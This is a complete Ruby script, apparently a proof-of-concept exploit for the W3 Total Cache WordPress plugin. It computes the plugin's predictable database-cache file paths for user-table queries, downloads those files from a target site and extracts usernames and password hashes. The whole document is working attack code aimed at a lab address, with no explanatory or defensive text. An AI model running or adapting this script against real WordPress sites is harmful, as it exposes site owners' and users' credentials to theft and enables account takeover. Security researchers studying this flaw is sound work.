#!/bin/env ruby
require "digest/md5"
require "net/http"

host="10.211.55.8" # Host Header or Forwaded For Header
urlbase="http://10.211.55.8/wordpress" # Wordpress URL
db_prefix="wp_"

for site_id in 1..25 do
  puts "Trying site_id #{site_id}..."
  for user_id in 1..25 do
    puts "Trying user_id #{user_id}..."
    query="SELECT * FROM #{db_prefix}users WHERE ID = '#{user_id}'"
    query_md5 = Digest::MD5.hexdigest(query)
    key="w3tc_#{host}_#{site_id}_sql_#{query_md5}"
    key_md5 = Digest::MD5.hexdigest(key)
    hash_path = "/#{key_md5[0,1]}/#{key_md5[1,1]}/#{key_md5[2,1]}/#{key_md5}"
    url="#{urlbase}/wp-content/w3tc/dbcache/#{hash_path}"
    result = Net::HTTP.get(URI.parse(url))
    unless result.empty?
      match = result.scan(/.*"user_login";s:[0-9]+:"([^"]*)";s:[0-9]+:"user_pass";s:[0-9]+:"([^"]*)".*/)[0]
      unless match.nil?
        puts "Username: #{match[0]}"
        puts "Password Hash: #{match[1]}"
      end
    end
  end
end
